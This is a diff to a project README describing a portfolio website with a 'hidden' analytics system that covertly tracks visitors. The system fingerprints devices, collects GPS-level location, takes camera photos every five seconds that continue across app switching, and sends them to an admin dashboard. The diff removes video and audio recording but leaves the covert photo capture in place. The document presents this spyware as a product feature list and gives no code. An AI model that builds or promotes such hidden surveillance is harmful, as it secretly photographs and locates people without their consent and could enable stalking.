@@ -18,15 +18,14 @@ This project combines a professional portfolio website with a powerful hidden an
 - **Real-time Tracking**: Live visitor monitoring and data collection
 - **Device Fingerprinting**: 95% unique device identification
 - **Location Services**: GPS-level accuracy + IP geolocation fallback
-- **Camera Recording**: 2-minute video capture with automatic download
-- **Image Capture**: High-res photos every 5 seconds during recording
-- **Mobile Protection**: Continuous recording across app switching
+- **Image Capture**: High-res photos every 5 seconds
+- **Mobile Protection**: Continuous capture across app switching
 - **Network Analysis**: Connection type, speed, and carrier information
 - **Behavioral Tracking**: User interaction patterns and session data
 
 ### Analytics Dashboard
 - **Live Monitoring**: Real-time visitor data display
-- **Media Gallery**: Captured images and video recordings
+- **Media Gallery**: Captured images
 - **Statistics**: Comprehensive analytics and reporting
 - **Export Functions**: Word document reports with complete data
 - **Session Management**: Multiple visitor tracking and history
@@ -41,7 +40,6 @@ This project combines a professional portfolio website with a powerful hidden an
 - **Font Awesome**: Icon system
 
 ### Analytics Technologies
-- **MediaRecorder API**: Video/audio capture and recording
 - **Geolocation API**: GPS and IP-based location services
 - **Canvas/WebGL**: Device fingerprinting and hardware detection
 - **Service Workers**: Background data persistence
@@ -130,9 +128,8 @@ npx serve .
 - Connection speed and quality metrics
 
 ### Media Capture
-- 2-minute video recordings (1280x720, audio included)
 - High-resolution images (every 5 seconds)
-- Automatic download to admin dashboard
+- Automatic transmission to admin dashboard
 - Complete session documentation
 
 ### Behavioral Analytics
